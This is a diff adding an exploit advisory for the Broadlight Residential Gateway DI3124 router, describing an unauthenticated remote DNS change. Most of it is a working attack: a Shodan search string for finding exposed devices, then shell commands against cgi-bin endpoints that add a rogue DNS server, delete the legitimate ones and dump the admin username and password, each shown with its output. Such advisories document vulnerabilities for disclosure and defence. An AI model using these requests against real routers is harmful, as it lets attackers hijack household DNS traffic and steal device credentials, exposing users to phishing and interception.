@@ -1,0 +1,50 @@
+  Broadlight Residential Gateway DI3124 
+  Unauthenticated Remote DNS Change
+
+  Copyright 2015 (c) Todor Donev 
+  <todor.donev at gmail.com>
+  http://www.ethical-hacker.org/
+  https://www.facebook.com/ethicalhackerorg
+
+  No description for morons, 
+  script kiddies & noobs !!
+
+  Disclaimer:
+  This or previous programs is for Educational
+  purpose ONLY. Do not use it without permission.
+  The usual disclaimer applies, especially the
+  fact that Todor Donev is not liable for any
+  damages caused by direct or indirect use of the
+  information or functionality provided by these
+  programs. The author or any Internet provider
+  bears NO responsibility for content or misuse
+  of these programs or any derivatives thereof.
+  By using these programs you accept the fact
+  that any damage (dataloss, system crash,
+  system compromise, etc.) caused by the use
+  of these programs is not Todor Donev's
+  responsibility.
+  
+  Use them at your own risk!
+
+  ShodanHQ Dork:
+  Server: thttpd/2.25b 29dec2003 Content-Length: 348414
+
+
+[todor@adamantium ~]$ GET "http://TARGET/cgi-bin/getdns.cgi?"
+{"success":true,"totalCount":2,"rows":[{"domain":"googleDNS1","serverip":"8.8.8.8","type":"manual"},
+{"domain":"googleDNS2","serverip":"8.8.4.4","type":"manual"}]}
+
+[todor@adamantium ~]$ GET "http://TARGET/cgi-bin/savedns.cgi?domainname=evilDNS&domainserverip=133.71.33.7"
+{success:true,errormsg:"Operation Succeeded"}
+
+[todor@adamantium ~]$ GET "http://TARGET/cgi-bin/deldns.cgi?serverip=8.8.8.8"
+{success:true,errormsg:"Operation Succeeded"}
+
+[todor@adamantium ~]$ GET "http://TARGET/cgi-bin/deldns.cgi?serverip=8.8.4.4"
+{success:true,errormsg:"Operation Succeeded"}
+
+[todor@adamantium ~]$ GET "http://TARGET/cgi-bin/getconf.cgi" | egrep '(username|password)'
+<username>admin</username>
+<password>admin</password>
+
